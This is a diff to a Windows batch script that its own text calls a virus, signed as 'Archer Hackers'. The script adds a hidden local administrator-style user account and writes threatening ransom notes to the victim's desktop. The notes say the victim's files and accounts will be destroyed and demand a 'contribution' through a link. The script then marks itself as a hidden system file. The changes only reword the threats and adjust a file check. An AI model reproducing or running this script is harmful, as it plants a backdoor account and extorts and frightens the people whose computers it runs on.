@@ -17,7 +17,8 @@ echo Sending info to a text file to desktop: desk-ahack23...
 echo
 pause
 echo %username%,
-echo cause things are bout' to get a whole lot worse... and so you will regret it...
+echo because things are bout' to get a whole lot worse,
+echo you are going to regret running this virus...
 pause
 net user archeradmin /add
 mkdir %userprofile%\Desktop\ARCHERHACKERSDATA
@@ -25,7 +26,7 @@ echo 01010100 01101000 01100101 00100000 01000001 01110010 01100011 01101000 011
 echo You are our next target, %username%... because you will never get your computer and accounts back... and we will do something bad to both of those things so be ready for your work to all be gone... archer hackers are happy! (:... and also we will say something to you, %username%... you know you have been hacked by Archer Hackers right? well you need to contribute to our team or else we will use your location for fun... (: so do it quick! > %userprofile%\desktop\ARCHERHACKERSDATA\note.txt
 echo We will meet you soon, in 10 minutes, %username%... so always contribute to the Archer Hackers team fast, but here is a quick note: You will be a never forgotten victim of ours... > %userprofile%\desktop\ARCHERHACKERSDATA\remembertokeep.txt
 echo Heres the link to contribute: https://ahakers.com/contrib/victim > %userprofile%\desktop\ARCHERHACKERSDATA\contrib.txt
-if not exist %userprofile%\desktop\ARCHERHACKERSDATA\contrib.txt echo %username% there is something off with you...i think you deleted our contrib file...so get ready > %userprofile%\desktop\ARCHERHACKERSDATA\youarenext.txt
+if not exist %userprofile%\desktop\ARCHERHACKERSDATA\contrib echo %username% there is something off with you...i think you deleted our contrib file...so get ready > %userprofile%\desktop\ARCHERHACKERSDATA\youarenext.txt
 attrib +s +h %userprofile%\desktop\creepy.bat
 start explorer.exe
 exit
